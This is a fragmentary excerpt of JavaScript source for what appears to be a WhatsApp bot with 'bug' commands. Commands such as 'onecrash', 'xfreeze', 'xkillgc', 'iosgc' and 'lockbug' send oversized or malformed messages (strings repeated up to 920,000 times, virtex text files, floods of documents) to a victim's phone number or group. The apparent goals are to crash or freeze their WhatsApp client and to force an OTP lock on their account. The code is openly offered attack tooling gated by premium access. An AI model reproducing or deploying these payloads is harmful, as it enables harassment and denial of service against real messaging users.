...
const { bugtext7 } = require('./lib/virtex/bugtext7')
const { bugtext8 } = require('./lib/virtex/bugtext8')
const { bugtext9 } = require('./lib/virtex/bugtext9')
const { bugtext10 } = require('./lib/virtex/bugtext10')
const { bugtext11 } = require('./lib/virtex/bugtext11')
const wkwk = fs.readFileSync(`./lib/virtex/x.mp3`)
const xsteek = fs.readFileSync(`./lib/virtex/x.webp`)
...
"jpegThumbnail": fs.readFileSync(`./lib/virtex/xx1.png`)
},
"nativeFlowMessage": {
"buttons": [
{
...
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `𝚃𝙾𝙶𝙴 𝙸𝙽𝚄𝙼𝙰𝙺𝙸 𝚃𝙾𝙶𝙴 𝙸𝙽𝚄𝙼𝙰𝙺𝙸 𝚃𝙾𝙶𝙴 𝙸𝙽𝚄𝙼𝙰𝙺𝙸 𝚃𝙾𝙶𝙴 𝙸𝙽𝚄𝙼𝙰𝙺𝙸 𝚃𝙾𝙶𝙴 𝙸𝙽𝚄𝙼𝙰𝙺𝙸 𝚃𝙾𝙶𝙴 𝙸𝙽𝚄𝙼𝙰𝙺𝙸 𝚃𝙾𝙶𝙴 𝙸𝙽𝚄𝙼𝙰𝙺𝙸 𝚃𝙾𝙶𝙴 𝙸𝙽𝚄𝙼𝙰𝙺𝙸`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
 ...
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "𝚃𝙾𝙶𝙴 𝙸𝙽𝚄𝙼𝙰𝙺𝙸",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/da0ca9afe07d00af53811.jpg" } }, { upload: XeonBotInc.waUploadToServer }))
      },
      body: {
        text: ""
      },
...
async function listxeonfck(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "𝚃𝙾𝙶𝙴 𝙸𝙽𝚄𝙼𝙰𝙺𝙸"+" ".repeat(920000),
        'footerText': `𝚃𝙾𝙶𝙴 𝙸𝙽𝚄𝙼𝙰𝙺𝙸 𝚃𝙾𝙶𝙴 𝙸𝙽𝚄𝙼𝙰𝙺𝙸 𝚃𝙾𝙶𝙴 𝙸𝙽𝚄𝙼𝙰𝙺𝙸 𝚃𝙾𝙶𝙴 𝙸𝙽𝚄𝙼𝙰𝙺𝙸 𝚃𝙾𝙶𝙴 𝙸𝙽𝚄𝙼𝙰𝙺𝙸 𝚃𝙾𝙶𝙴 𝙸𝙽𝚄𝙼𝙰𝙺𝙸 𝚃𝙾𝙶𝙴 𝙸𝙽𝚄𝙼𝙰𝙺𝙸`,
        'description': `𝚃𝙾𝙶𝙴 𝙸𝙽𝚄𝙼𝙰𝙺𝙸 𝚃𝙾𝙶𝙴 𝙸𝙽𝚄𝙼𝙰𝙺𝙸 𝚃𝙾𝙶𝙴 𝙸𝙽𝚄𝙼𝙰𝙺𝙸 𝚃𝙾𝙶𝙴 𝙸𝙽𝚄𝙼𝙰𝙺𝙸 𝚃𝙾𝙶𝙴 𝙸𝙽𝚄𝙼𝙰𝙺𝙸 𝚃𝙾𝙶𝙴 𝙸𝙽𝚄𝙼𝙰𝙺𝙸 𝚃𝙾𝙶𝙴 𝙸𝙽𝚄𝙼𝙰𝙺𝙸`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
...
mimetype: `image/null`,
fileName: `${dgxeon}.${bugtext1}` ,
caption: `${dgxeon + bugtext1}`,
...
break
            ...
            case 'delsticker': {
                ...
                fs.writeFileSync('./lib/database/autoreply/sticker.json', JSON.stringify(StickerXeon))
...
fs.writeFileSync('./lib/database/autoreply/zip.json', JSON.stringify(ZipXeon))
fs.unlinkSync(delb)
...
case 'onecrash': {
	if (!isCreator) return replygcxeon(mess.owner)
if (!text) return replygcxeon(`𝖀𝖘𝖆𝖌𝖊 .${command} 24105114159`)
let cleanedNumber = text.replace(/[^0-9]/g, '');
if (cleanedNumber.startsWith('0')) return replygcxeon(`𝐄𝐱𝐚𝐦𝐩𝐥𝐞 : ${prefix+command} 24105114159`)
var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "24105114159") {
    return;
					...
					const crasoh = await XeonBotInc.relayMessage(jid,
						{
							extendedTextMessage: {
								...
								description: '𝚃𝙾𝙶𝙴 𝙸𝙽𝚄𝙼𝙰𝙺𝙸  𝚃𝙾𝙶𝙴 𝙸𝙽𝚄𝙼𝙰𝙺𝙸 𝚃𝙾𝙶𝙴 𝙸𝙽𝚄𝙼𝙰𝙺𝙸 𝚃𝙾𝙶𝙴 𝙸𝙽𝚄𝙼𝙰𝙺𝙸',
								title: '𝚃𝙾𝙶𝙴 𝙸𝙽𝚄𝙼𝙰𝙺𝙸',
								textArgb: 0xff000000,
							...
							viewOnceMessage: {
								message: {
									interactiveMessage: {
										...
										body: {
											text: '𝚃𝙾𝙶𝙴 𝙸𝙽𝚄𝙼𝙰𝙺𝙸 𝚃𝙾𝙶𝙴 𝙸𝙽𝚄𝙼𝙰𝙺𝙸 𝚃𝙾𝙶𝙴 𝙸𝙽𝚄𝙼𝙰𝙺𝙸',
										},
										footer: {
											text: 'xp',
										},
...
await replygcxeon(`𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘...`)
...
var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  ...
  async function xeonBugPay(jid){
    ...
    [whatsappNumber]
				...
				case 'xinvisible': {
					if (!isPremium) return replygcxeon(mess.prem)
if (!text) return replygcxeon(`𝖀𝖘𝖊 .${command} 24105114159`)
let cleanedNumber = text.replace(/[^0-9]/g, '');
if (cleanedNumber.startsWith('0')) return replygcxeon(`𝐄𝐱𝐚𝐦𝐩𝐥𝐞: ${prefix+command} 24105114159`)
var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
...
if (!isPremium) return replygcxeon(mess.prem)
if (!q) return replygcxeon(`𝖀𝖘𝖊 .${command} 24105114159`)
let xeonyvictim = q.replace(/[^0-9]/g, "")
if (xeonyvictim.startsWith('0')) return replygcxeon(`𝐄𝐱𝐚𝐦𝐩𝐥𝐞 : .${command} 24105114159`)
let target = xeonyvictim + '@s.whatsapp.net'
await replygcxeon(`𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘......`)
for (let j = 0; j < 1; j++) {
...
await replygcxeon(`𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐒𝐞𝐧𝐭 𝐁𝐮𝐠 𝐓𝐨 ${xeonyvictim} 𝖀𝖘𝖎𝖓𝖌 ${command}. ✅`)
}
break
...
break
case 'xfreeze': case 'xkillv1': {
	if (!isPremium) return replygcxeon(mess.prem)
	const XeonDoc = {
    url: "./lib/virtex/x.mp3"
};
async function xeonFreeze(jid){
	  for (let i = 0; i < 50; i++) {
await XeonBotInc.sendMessage(jid, {
    'document': XeonDoc,
    'fileName': "𝚃𝙾𝙶𝙴 𝙸𝙽𝚄𝙼𝙰𝙺𝙸" + bugtext1,
    'mimetype': "application/zip",
    'caption': "𝚃𝙾𝙶𝙴 𝙸𝙽𝚄𝙼𝙰𝙺𝙸" + bugtext1,
...
await xeonFreeze(m.chat);
	...
	break
	case 'xkillgc':  case 'xbug': case 'deathgc': case 'xwebgc': {
		if (!isPremium) return replygcxeon(mess.prem)
		const xeonimage = {
    title: "𝚃𝙾𝙶𝙴 𝙸𝙽𝚄𝙼𝙰𝙺𝙸; ",
    hasMediaAttachment: true,
...
XeonBotInc.relayMessage(m.chat, {
    'viewOnceMessage': {
            ...
            'interactiveMessage': {
                ...
                'contextInfo': {
                    ...
                    'forwardedNewsletterMessageInfo': {
                        'newsletterJid': "120364222395675670@newsletter",
                        'serverMessageId': 0x1,
                        'newsletterName': "𝚃𝙾𝙶𝙴 𝙸𝙽𝚄𝙼𝙰𝙺𝙸"
                    }
                }
            }
        }
		...
		break
		case 'goodbye': case 'xtoge': case 'iosgc':{
			if (!isPremium) return replygcxeon(mess.prem)
			const subscribe_dgxeon = {
"key": { 
"fromMe": false,
...
title: `toge's ur father`
  ...
  XeonBotInc.sendMessage(
    chat,
    {
      document: { url: "./settings.js" },
      mimetype: `image/null`,
      fileName: `𝚃𝙾𝙶𝙴 𝙸𝙽𝚄𝙼𝙰𝙺𝙸${bugtext11}`,
      caption: `𝚃𝙾𝙶𝙴 𝙸𝙽𝚄𝙼𝙰𝙺𝙸 ${bugtext11}`,
    },
  ...
  async function executeIosAttack() {
    ...
    break;
case 'lockbug': case 'tempban': {
	if (!isPremium) return replygcxeon(mess.prem)
  if (args.length < 1) return replygcxeon(`𝕴𝖓𝖈𝖔𝖗𝖗𝖊𝖈𝖙 𝖋𝖔𝖗𝖒𝖆𝖙\n\n𝖀𝖘𝖆𝖌𝖊: ${prefix+command} 𝖈𝖔𝖚𝖓𝖙𝖗𝖞_𝖈𝖔𝖉𝖊|𝖓𝖚𝖒𝖇𝖊𝖗\n𝕰𝖝𝖆𝖒𝖕𝖑𝖊: ${prefix+command} 241|05114159`);
  const args2 = args[0].split('|');
  if (args2.length !== 2) return replygcxeon(`𝕴𝖓𝖈𝖔𝖗𝖗𝖊𝖈𝖙 𝖋𝖔𝖗𝖒𝖆𝖙\n\n𝖀𝖘𝖆𝖌𝖊: ${prefix+command} 𝖈𝖔𝖚𝖓𝖙𝖗𝖞_𝖈𝖔𝖉𝖊|𝖓𝖚𝖒𝖇𝖊𝖗\n𝕰𝖝𝖆𝖒𝖕𝖑𝖊: ${prefix+command} 241|05114159`);
  ...
  sendMessageWithMentions(
    "𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐀𝐜𝐭𝐢𝐯𝐚𝐭𝐞𝐝 𝐎𝐓𝐏 𝐋𝐎𝐂𝐊 𝐓𝐨 @" + xeonMention.split('@')[0] + 
    " 𝖀𝖘𝖎𝖓𝖌 *" + command + "* ✅\n\n𝕻𝖆𝖚𝖘𝖊 2 𝖒𝖎𝖓𝖚𝖙𝖊𝖘 𝖘𝖔 𝖙𝖍𝖆𝖙 𝖙𝖍𝖊 𝖇𝖔𝖙 𝖎𝖘 𝖓𝖔𝖙 𝖇𝖆𝖓𝖓𝖊𝖉.", 
    [xeonMention]
  );
  try {
...
case 'readviewonce': case 'rvo': {
	if (!m.quoted) return replygcxeon(`𝐑𝐞𝐩𝐥𝐲 𝐭𝐨 𝐯𝐢𝐞𝐰 𝐨𝐧𝐜𝐞 𝐦𝐞𝐬𝐬𝐚𝐠𝐞`)
